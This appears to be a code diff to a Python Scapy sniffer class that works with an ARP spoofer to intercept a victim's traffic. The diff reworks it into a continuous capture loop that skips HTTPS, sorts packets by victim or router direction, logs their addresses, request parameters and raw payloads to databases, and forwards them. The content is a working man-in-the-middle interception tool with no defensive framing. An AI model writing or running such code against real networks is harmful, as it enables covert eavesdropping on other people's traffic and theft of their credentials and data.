@@ -1,6 +1,6 @@
 from scapy.all import *
 from scapy.layers.inet import IP, TCP
-
+from threading import Lock
 from arpspoofer import ArpSpoofer
 from database import DataBase
 
@@ -9,25 +9,27 @@ class Sniffer:
 
     def __init__(self, destinationMac, targetIP, gatewayIP, sourceMAC):
         self.spoofer = ArpSpoofer(destinationMac, targetIP, gatewayIP, sourceMAC)
-        self.db = DataBase()
+        self.db_router = DataBase()
+        self.db_victim = DataBase()
         self.packets = 0
+        self.packets_lock = Lock()
 
     def start_spoofing(self):
         self.spoofer.start()
 
-    def victim_filter(self, packet):
-        return IP in packet and packet[IP].src == self.spoofer.targetIP and Raw in packet and TCP in packet
+    def all_filter(self,packet):
+        return IP in packet and Raw in packet and TCP in packet and packet[TCP].sport != 443 and packet[TCP].dport != 443
 
-    def receive_victim(self):
-        p = sniff(count=1, lfilter=self.victim_filter)
-        return p
+    def sniff_all(self):
+        sniff(lfilter=self.all_filter, prn=self.navigate_packets)
 
-    def router_filter(self, packet):
-        return IP in packet and packet[IP].src == self.spoofer.gatewayIP and Raw in packet and TCP in packet
-
-    def receive_router(self):
-        p = sniff(count=1, lfilter=self.router_filter)
-        return p
+    def navigate_packets(self, packet):
+        if packet[IP].src == self.spoofer.targetIP:
+            self.handle_packets_from_victim(packet)
+        elif packet[IP].dst == self.spoofer.targetIP:
+            self.handle_packets_from_router(packet)
+        else:
+            pass
 
     def send_packet(self, packet):
         send(packet)
@@ -72,12 +74,11 @@ class Sniffer:
         packet[Raw].load = list
 
 
-    def handle_packets_from_victim(self):
+    def handle_packets_from_victim(self,packet):
         print("start h/p/v")
-        packets = self.receive_victim()
-        packet = packets[0]
+        self.db_victim = DataBase()
         #try:
-        self.db.write_to_victim(self.packets, packet[IP].src, packet[IP].dst, self.find_req_type(packet),
+        self.db_victim.write_to_victim(self.packets, packet[IP].src, packet[IP].dst, self.find_req_type(packet),
                                 self.find_req_param(packet), packet[Raw].load, packet[TCP].sport, packet[TCP].dport)
         #except TypeError:
             #print(TypeError)
@@ -85,7 +86,8 @@ class Sniffer:
 
         # fetchall returns list of tupples
         #self.db.get_from_router(self.packets, True, True, True, True, True, True, True)
-        #self.packets += 1
+        with self.packets_lock:
+            self.packets += 1
         #param_dict = {"src_ip": None, "dst_ip": None, "req_type": None, "req_params": None, "data": None,
          #             "src_port": None, "dst_port": None, "ttl": None}
         #for key in param_dict:
@@ -99,15 +101,15 @@ class Sniffer:
          #                               packet[TCP].sport, packet[TCP].dport)
         self.send_packet(packet)
 
-    def handle_packets_from_router(self):
+    def handle_packets_from_router(self, packet):
         print("h/p/r")
-        packets = self.receive_router()
-        packet = packets[0]
-        self.db.write_to_router(self.packets, packet[IP].src, packet[IP].dst, self.find_req_type(packet),
-                                self.find_req_param(packet), packet[Raw].load,packet[TCP].sport, packet[TCP].dport)
+        self.db_router = DataBase()
+        self.db_router.write_to_router(self.packets, packet[IP].src, packet[IP].dst, self.find_req_type(packet),
+                                    self.find_req_param(packet), packet[Raw].load,packet[TCP].sport, packet[TCP].dport)
         # fetchall returns list of tupples
         #self.db.get_from_router(self.packets, True, True, True, True, True, True, True)
-        #self.packets += 1
+        with self.packets_lock:
+            self.packets += 1
         #param_dict = {"src_ip": None, "dst_ip": None, "req_type": None, "req_params": None, "data": None,
         #              "src_port": None, "dst_port": None, "ttl": None}
         #for key in param_dict:
